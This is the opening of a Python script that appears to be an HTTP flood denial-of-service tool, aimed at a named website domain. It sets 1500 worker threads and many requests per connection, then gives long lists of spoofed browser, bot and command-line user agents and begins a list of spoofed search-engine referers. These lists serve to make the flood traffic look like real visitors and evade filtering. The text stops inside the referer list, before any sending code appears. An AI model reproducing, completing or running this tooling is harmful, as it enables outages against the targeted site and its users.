#!/usr/bin/env python3

import socket
import ssl
import sys
import time
import random
import string
import threading
import os

# ==============================================================================
# TARGET CONFIGURATION — EDIT THESE
# ==============================================================================
TARGET_DOMAIN   = "www.claro-london.com"   # <-- bare domain, no scheme, no port
SAFE_MODE       = False                  # True = stop early on hard failure
THREADS_DEFAULT = 1500                    # concurrent worker threads
# ==============================================================================

# ----------------------------- TUNABLES -----------------------------
SOCK_TIMEOUT       = 5
REQUESTS_PER_CONN  = 50
STATS_INTERVAL     = 5
DNS_REFRESH        = 30
TLS_PROBE_TIMEOUT  = 3

# ----------------------------- USER AGENTS -----------------------------
USER_AGENTS = [
    # --- Chrome / Chromium (Desktop) ---
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    # --- Chrome / Chromium Mobile ---
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; moto g power) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Redmi Note 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Android 13; Mobile; rv:121.0) Gecko/121.0 Firefox/121.0",
    # --- Firefox (Desktop) ---
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13.6; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    # --- Safari (Desktop) ---
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15",
    # --- Safari (Mobile) ---
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    # --- Edge / Opera / Brave / Vivaldi ---
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 OPR/107.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 OPR/105.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Brave/122",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Brave/121",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Vivaldi/6.5.3206.53",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Vivaldi/6.4.3160.47",
    # --- Samsung Internet ---
    "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/22.0 Chrome/111.0.0.0 Mobile Safari/537.36",
    # --- Legacy IE ---
    "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727)",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)",
    # --- Legacy Firefox ---
    "Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0",
    "Mozilla/5.0 (X11; OpenBSD amd64; rv:28.0) Gecko/20100101 Firefox/28.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101 Firefox/28.0",
    "Mozilla/5.0 (Windows NT 6.1; rv:27.3) Gecko/20130101 Firefox/27.3",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:24.0) Gecko/20100101 Firefox/24.0",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
    "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
    "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
    "Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7",
    # --- Search Engine Bots ---
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/41.0.2272.96",
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "Googlebot-Image/1.0",
    "Googlebot-News",
    "Googlebot-Video/1.0",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; BingPreview/1.0b; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
    "Mozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)",
    "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
    "Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)",
    "YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)",
    "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
    "Baiduspider+(+http://www.baidu.com/search/spider.htm)",
    "Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )",
    "Mozilla/5.0 (compatible; DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html))",
    "DuckDuckBot/1.1; (+http://duckduckgo.com/duckduckbot.html)",
    "Mozilla/5.0 (compatible; Applebot/0.3; +http://www.apple.com/go/applebot)",
    "Mozilla/5.0 (compatible; Sogou web spider/4.0; +http://www.sogou.com/docs/help/webmasters.htm#07)",
    "Mozilla/5.0 (compatible; Exabot/3.0; +http://www.exabot.com/go/robot)",
    "Mozilla/5.0 (compatible; NaverBot/1.0; http://help.naver.com/robots/)",
    "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)",
    "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)",
    "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)",
    "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)",
    "Mozilla/5.0 (compatible; PetalBot; +https://webmaster.petalsearch.com/site/petalbot)",
    # --- Social / Link Preview Bots ---
    "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
    "FacebookBot/1.0",
    "Twitterbot/1.0",
    "Twitterbot/1.1",
    "LinkedInBot/1.0 (compatible; Mozilla/5.0; Apache-HttpClient +http://www.linkedin.com)",
    "WhatsApp/2.23.20.0",
    "TelegramBot (like TwitterBot)",
    "Slackbot-LinkExpanding 1.0 (+https://api.slack.com/robots)",
    "Discordbot/2.0; +https://discordapp.com",
    "Pinterest/0.2 (+https://www.pinterest.com/bot.html)",
    "redditbot/1.0 (+https://www.reddit.com/wiki/bots)",
    # --- SEO / Crawlers ---
    "Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0) AddSugarSpiderBot www.idealobserver.com",
    "Mozilla/5.0 (compatible; AnyApexBot/1.0; +http://www.anyapex.com/bot.html)",
    "Mozilla/4.0 (compatible; Arachmo)",
    "Mozilla/4.0 (compatible; B-l-i-t-z-B-O-T)",
    "Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)",
    "BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)",
    "Sqworm/2.9.85-BETA (beta_release; 20011115-775; i686-pc-linux-gnu)",
    "Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)",
    "Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)",
    "Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)",
    "Mozilla/5.0 (compatible; AbiLogicBot/1.0; +http://www.abilogic.com/bot.html)",
    "SiteBar/3.3.8 (Bookmark Server; http://sitebar.org/)",
    # --- Mobile / Feature Phones ---
    "Mozilla/5.0 (BlackBerry; U; BlackBerry 9900; en) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.1.0.346 Mobile Safari/534.11+",
    "Mozilla/5.0 (BlackBerry; U; BlackBerry 9850; en-US) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.0.0.254 Mobile Safari/534.11+",
    "BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0",
    "BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179",
    "Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413",
    "Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413",
    "Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15",
    "Opera/9.80 (J2ME/MIDP; Opera Mini/9.80 (J2ME/MIDP; Opera Mini/9.80 (S60; SymbOS; Opera Mobi/23.348; U; en) Presto/2.5.25 Version/10.54",
    "Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)",
    "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0",
    "Mozilla/5.0 (PLAYSTATION 3; 3.55)",
    "Mozilla/5.0 (PLAYSTATION 3; 2.00)",
    "Mozilla/5.0 (PLAYSTATION 3; 1.00)",
    "Mozilla/5.0 (PlayStation 4 3.11) AppleWebKit/537.73 (KHTML, like Gecko)",
    "Mozilla/5.0 (PlayStation 5/SmartTV) AppleWebKit/605.1.15 (KHTML, like Gecko)",
    "Mozilla/5.0 (Nintendo Switch; WifiWebAuthApplet) AppleWebKit/609.4 (KHTML, like Gecko) NF/6.0.2.21.3 NintendoBrowser/5.1.0.22023",
    "Mozilla/5.0 (Nintendo WiiU) AppleWebKit/536.30 (KHTML, like Gecko) NX/3.0.4.2.12 NintendoBrowser/4.3.1.11264.US",
    "Mozilla/5.0 (SMART-TV; Linux; Tizen 7.0) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/5.0 Chrome/106.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 WebAppManager",
    "Roku/DVP-11.5 (11.5.0.4184-46)",
    "AppleTV11,1/11.1",
    # --- HTTP Libraries / CLI Tools ---
    "curl/8.5.0",
    "curl/8.4.0",
    "curl/7.88.1",
    "Wget/1.21.4",
    "Wget/1.20.3 (linux-gnu)",
    "Wget/1.10.1",
    "Wget/1.8.2",
    "python-requests/2.31.0",
    "Python-urllib/3.11",
    "python-requests/2.28.2",
    "Go-http-client/2.0",
    "Go-http-client/1.1",
    "Java/1.8.0_291",
    "Java/17.0.1",
    "okhttp/4.11.0",
    "okhttp/4.9.3",
    "axios/1.6.5",
    "node-fetch/1.0 (+https://github.com/bitinn/node-fetch)",
    "PostmanRuntime/7.36.0",
    "insomnia/8.6.0",
    "HTTPie/3.2.2",
    "libwww-perl/6.72",
    "Apache-HttpClient/4.5.14 (Java/17.0.1)",
    "Apache-HttpClient/5.2.1 (Java/17.0.1)",
    # --- Specialty ---
    "Links (2.28; Linux 5.15.0-91-generic x86_64; GNU C 11.4; text)",
    "Lynx/2.8.9rel.1 libwww-FM/2.14 SSL-MM/1.4.1 GNUTLS/3.6.16",
    "ELinks/0.14.3 (textmode; Linux; 80x24-2)",
    "w3m/0.5.3+git20230121",
    "Dillo/3.0.5",
    "Mozilla/5.0 (compatible; Konqueror/4.14; Linux) KHTML/4.14.38 (like Gecko)",
    "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
    "Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10",
    "Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10",
    "Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15",
    "Opera/9.20 (Windows NT 6.0; U; en)",
    "Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0",
    # --- Misc bots / legacy --- 
    "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser 1.98.744; .NET CLR 3.5.30729)",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; Acoo Browser; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; Avant Browser)",
    "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/419 (KHTML, like Gecko, Safari/419.3) Cheshire/1.0.ALPHA",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10 ChromePlus/1.5.1.1",
    "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7",
    "Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Comodo_Dragon/4.1.1.11 Chrome/4.1.249.1042 Safari/532.5",
    "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)",
    "Mozilla/5.0(compatible; MSIE 10.0; Windows NT 6.1; Trident/4.0; InfoPath.2; SV1; .NET CLR 2.0.50727; WOW64)",
    "Mozilla/5.0 (compatible; MSIE 10.0; Macintosh; Intel Mac OS X 10_7_3; Trident/6.0)",
    "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A",
    "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:24.0) Gecko/20100101 Thunderbird/24.4.0",
    "iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)",
    "Mozilla/4.0 (compatible; WebCapture 3.0; Macintosh)",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (FM Scene 4.6.1)",
    "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.8) Gecko/20071004 Iceweasel/2.0.0.8 (Debian-2.0.0.6+2.0.0.8-Oetch1)",
    "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1",
    "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; ja-jp) AppleWebKit/417.9 (KHTML, like Gecko) Safari/417.8",
    "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20051010 Firefox/1.0.7 (Ubuntu package 1.0.7)",
    "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4",
    "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13",
    "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8",
    "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7",
    "Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)",
    "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)",
    "Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)",
    "Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)",
    "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)",
    "Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)",
    "Googlebot/2.1 (http://www.googlebot.com/bot.html)",
    "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)",
    "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)",
    "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
    "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)",
    "Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)",
    "Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1",
    "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)",
    "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)",
    "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)",
    "Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E)",
    "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57",
    "Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0",
    "Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g",
    "Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)",
    "Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413",
    "Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)",
    "Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)",
    "Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)",
    "Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10",
    "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0",
    "Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10",
    "Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
    "Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)",
    "Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16",
    "Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",
    "Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)",
    "Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)",
    "Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)",
    "Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7",
    "Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)",
]

# ----------------------------- REFERERS -----------------------------
REFERERS = [
    # --- Search Engines ---
    "https://www.google.com/",
    "https://www.google.com/search?q=",
    "https://www.google.co.uk/",
    "https://www.google.de/",
    "https://www.google.fr/",
    "https://www.google.es/",
    "https://www.google.it/",
    "https://www.google.ru/",
    "https://www.google.co.jp/",
    "https://www.google.com.br/",
    "https://www.google.ca/",
    "https://www.google.com.au/",
    "https://www.google.co.in/",
    "https://www.bing.com/",
    "https://www.bing.com/search?q=",
    "https://www.bing.com/images/search?q=",
    "https://duckduckgo.com/",
    "https://duckduckgo.com/?q=",
    "https://search.yahoo.com/",
    "https://search.yahoo.com/search?p=",
    "https://yandex.com/",
    "https://yandex.com/search/?text=",
    "https://yandex.ru/",
    "https://yandex.ru/search/?text=",
